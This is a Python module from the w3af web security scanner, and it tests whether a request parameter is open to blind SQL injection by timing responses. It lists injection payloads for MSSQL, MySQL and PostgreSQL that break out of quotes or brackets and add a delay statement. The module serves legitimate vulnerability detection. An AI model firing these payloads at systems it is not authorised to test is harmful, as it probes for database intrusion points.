"""
blind_sqli_time_delay.py

Copyright 2008 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import w3af.core.controllers.output_manager as om
import w3af.core.data.constants.severity as severity

from w3af.core.data.kb.vuln import Vuln
from w3af.core.controllers.delay_detection.exact_delay_controller import ExactDelayController
from w3af.core.controllers.delay_detection.exact_delay import ExactDelay


class blind_sqli_time_delay(object):
    """
    This class tests for blind SQL injection bugs using time delays, the logic
    is here and not as an audit plugin because this logic is also used in
    attack plugins.

    :author: Andres Riancho (andres.riancho@gmail.com)
    """

    def __init__(self, uri_opener):
        self._uri_opener = uri_opener

    def is_injectable(self, mutant):
        """
        Check if this mutant is delay injectable or not.

        @mutant: The mutant object that I have to inject to
        :return: A vulnerability object or None if nothing is found
        """
        for delay_obj in self._get_delays():

            ed = ExactDelayController(mutant, delay_obj, self._uri_opener)
            success, responses = ed.delay_is_controlled()

            if success:
                # Now I can be sure that I found a vuln, we control the response
                # time with the delay
                desc = 'Blind SQL injection using time delays was found at: %s'
                desc = desc % mutant.found_at()
                
                response_ids = [r.id for r in responses]
                
                v = Vuln.from_mutant('Blind SQL injection vulnerability', desc,
                                     severity.HIGH, response_ids, 'blind_sqli',
                                     mutant)

                om.out.debug(v.get_desc())

                return v

        return None

    def _get_delays(self):
        """
        :return: A list of statements that are going to be used to test for
                 blind SQL injections. The statements are objects.
                 
                 IMPORTANT: Note that I need this function that generates
                 unique instances of the delay objects! Adding this to a list
                 that's defined at the class level will bring threading issues
        """
        res = []

        # MSSQL
        res.append(ExactDelay("1;waitfor delay '0:0:%s'--"))
        res.append(ExactDelay("1);waitfor delay '0:0:%s'--"))
        res.append(ExactDelay("1));waitfor delay '0:0:%s'--"))
        res.append(ExactDelay("1';waitfor delay '0:0:%s'--"))
        res.append(ExactDelay("1');waitfor delay '0:0:%s'--"))
        res.append(ExactDelay("1'));waitfor delay '0:0:%s'--"))

        # MySQL 5
        #
        # Thank you guys for adding sleep(seconds) !
        #
        res.append(ExactDelay("1 or SLEEP(%s)"))
        res.append(ExactDelay("1' or SLEEP(%s) and '1'='1"))
        res.append(ExactDelay('1" or SLEEP(%s) and "1"="1'))

        # MySQL 4
        #
        # MySQL 4 doesn't have a sleep function, so I have to use BENCHMARK(1000000000,MD5(1))
        # but the benchmarking will delay the response a different amount of time in each computer
        # which sucks because I use the time delay to check!
        #
        # In my test environment 3500000 delays 10 seconds
        # This is why I selected 2500000 which is guaranteed to (at least) delay 8
        # seconds; and I only check the delay like this:
        #                 response.get_wait_time() > (original_wait_time + self._wait_time-2):
        #
        # With a small wait time of 5 seconds, this should work without problems...
        # and without hitting the ExtendedUrllib timeout !
        #
        #    TODO: Need to implement variable_delay.py (modification of ExactDelay)
        #          and use the following there:
        #
        #res.append( delay("1 or BENCHMARK(2500000,MD5(1))") )
        #res.append( delay("1' or BENCHMARK(2500000,MD5(1)) or '1'='1") )
        #res.append( delay('1" or BENCHMARK(2500000,MD5(1)) or "1"="1') )

        # PostgreSQL
        res.append(ExactDelay("1 or pg_sleep(%s)"))
        res.append(ExactDelay("1' or pg_sleep(%s) and '1'='1"))
        res.append(ExactDelay('1" or pg_sleep(%s) and "1"="1'))

        # TODO: Add Oracle support
        # TODO: Add XXXXX support

        return res
